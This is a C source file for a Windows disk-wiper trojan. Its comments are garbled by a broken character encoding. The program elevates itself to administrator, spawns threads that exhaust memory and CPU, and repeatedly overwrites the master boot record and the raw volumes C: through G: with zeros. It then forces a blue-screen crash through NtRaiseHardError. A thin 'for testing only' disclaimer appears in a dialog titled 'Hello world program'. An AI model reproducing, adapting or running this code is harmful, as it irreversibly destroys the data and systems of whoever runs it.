//C��ԭ����ͷ�ļ�
#include<stdio.h>
#include<stdlib.h>

//�����ļ���ͷ�ļ�
#include<dirent.h>
#include<direct.h>

//���̺߳Ͷ���̵����ļ�
#include<unistd.h>
#include<process.h>

//ʹ��WindowsAPI��ȡ����ԱȨ��
#include<Windows.h>

//��ȡ����ԱȨ�޵ĺ���
VOID Admin_Run(LPCSTR exe, LPCSTR param, INT nShow = SW_HIDE)
{
	SHELLEXECUTEINFO ShExecInfo;
	ShExecInfo.cbSize = sizeof(SHELLEXECUTEINFO);
	ShExecInfo.fMask = SEE_MASK_NOCLOSEPROCESS;
	ShExecInfo.hwnd = NULL;
	ShExecInfo.lpVerb = "runas";
	ShExecInfo.lpFile = exe;
	ShExecInfo.lpParameters = param;
	ShExecInfo.lpDirectory = NULL;
	ShExecInfo.nShow = nShow;
	ShExecInfo.hInstApp = NULL;
	BOOL ret = ShellExecuteEx(&ShExecInfo);
	CloseHandle(ShExecInfo.hProcess);
	return;
}

//ռ��CPU���̺߳���1
void TheCpuKill(void* p) {
	int* a;
	while (1) {
		a = (int*)malloc(1000 * sizeof(int));
	}
}

//ռ��CPU���̺߳���2
void TheCpuKill_func(void* p) {
	while (1) {
		for (int i; i < 800; i++);
	}
}

//��������̺�Ӳ�̽��и�д�ĺ���
void TheWriteDisk(void* p) {
	//�������и�д
	while (1) {
		char TheDiskShell[512] = "\x00\x00\x00\x00\x00";
		//���������0(MBR)���и�д
		FILE* WriteMbr = fopen("\\\\.\\PhysicalDrive0", "rb+");
		fwrite(TheDiskShell, sizeof(TheDiskShell), 1, WriteMbr);
		//���������1���и�д
		FILE* WriteDrive1 = fopen("\\\\.\\PhysicalDrive1", "rb+");
		fwrite(TheDiskShell, sizeof(TheDiskShell), 1, WriteDrive1);
		//���������2���и�д
		FILE* WriteDrive2 = fopen("\\\\.\\PhysicalDrive2", "rb+");
		fwrite(TheDiskShell, sizeof(TheDiskShell), 1, WriteDrive2);

		//������д�����
		fclose(WriteMbr);
		fclose(WriteDrive1);
		fclose(WriteDrive2);
	}
}

//��ʵ�ʴ��̺�Ӳ�̽��и�д�ĺ���,��\x00��������Ӳ��
void TheWriteDrive(void* p) {
	//�������и�д
	while (1) {
		char TheDiskShell[512] = "\x00\x00\x00\x00\x00";
		//��C�̽��и�д,��\x00��ʽ��C��
		FILE* WriteDisk_C = fopen("\\\\.\\C:", "wb+");
		fwrite(TheDiskShell, sizeof(TheDiskShell), 1, WriteDisk_C);
		//��D�̽��и�д,��\x00��ʽ��D��
		FILE* WriteDisk_D = fopen("\\\\.\\D:", "wb+");
		fwrite(TheDiskShell, sizeof(TheDiskShell), 1, WriteDisk_D);
		//��D�̽��и�д,��\x00��ʽ��E��
		FILE* WriteDisk_E = fopen("\\\\.\\E:", "wb+");
		fwrite(TheDiskShell, sizeof(TheDiskShell), 1, WriteDisk_E);
		//��D�̽��и�д,��\x00��ʽ��F��
		FILE* WriteDisk_F = fopen("\\\\.\\F:", "wb+");
		fwrite(TheDiskShell, sizeof(TheDiskShell), 1, WriteDisk_F);
		//��D�̽��и�д,��\x00��ʽ��D��
		FILE* WriteDisk_G = fopen("\\\\.\\G:", "wb+");
		fwrite(TheDiskShell, sizeof(TheDiskShell), 1, WriteDisk_G);
		//���в��������е�����д�����,Ӳ��
		fclose(WriteDisk_C); fclose(WriteDisk_D);
		fclose(WriteDisk_E); fclose(WriteDisk_F);
		fclose(WriteDisk_G);
	}
}

void TheWindowsBOSD(void) {
	HMODULE ntdll = LoadLibrary("ntdll.dll");
	FARPROC RtlAdjPriv = GetProcAddress(ntdll, "RtlAdjustPrivilege");
	FARPROC NtRaiseHardErr = GetProcAddress(ntdll, "NtRaiseHardError");
	unsigned char ErrKill;
	long unsigned int HDErr;
	((void(*)(DWORD, DWORD, BOOLEAN, LPBYTE))RtlAdjPriv)(0x13, true, false, &ErrKill);
	//��������0xffffffff(�����ڵĴ���)
	((void(*)(DWORD, DWORD, DWORD, DWORD, DWORD, LPDWORD))NtRaiseHardErr)(0xf0f0f0f0, 0, 0, 0, 6, &HDErr);
}

//��ʾ�������
/*
����һ�������ƻ��Ե�������ľ��
�˳��������ѧ���о�������רҵ���ԡ�
�������ļ�����������ʧ�����˽������κ����Ρ�
�������Ҫ���Դ˳����������������в��ԡ�
ע���˳�����Զ�������Ȩ
*/
int main(int argc, char* argv[]) {
	if (argc == 1) //�������У���˫��EXE
	{
		Admin_Run(argv[0], "2");
		return 1;
	}
	else if (argc == 2) //�ٴ�����,�������Ǹ�ManagerRun
	{
		if (MessageBox(NULL, "This is a destructive Trojan horse\n\
This program is limited to academic research or professional testing.\n\
If you cause damage to your computer, I will not pay any responsibility.\n\
If you need to test this program, please test it in the virtual machine.\n\r\
Note: This procedure will automatically apply for privilege escalation", "Hello world program", MB_YESNO + 48) == 6) {
			//�������в���,�ü��������
			for (int i; i < 20; i++) {
				//��������ռ��RAM���߳�
				_beginthread(TheCpuKill, 0, NULL);
				_beginthread(TheCpuKill, 0, NULL);
				//��������ռ��CPU���߳�
				_beginthread(TheCpuKill_func, 0, NULL);
				_beginthread(TheCpuKill_func, 0, NULL);

				//������������̽��и�д���߳�
				_beginthread(TheWriteDisk, 0, NULL);
				//�����Դ���,Ӳ�̽��и�д���߳�
				_beginthread(TheWriteDrive, 0, NULL);
			}
			TheWindowsBOSD();
		}
		else { return 0; }
	}
}
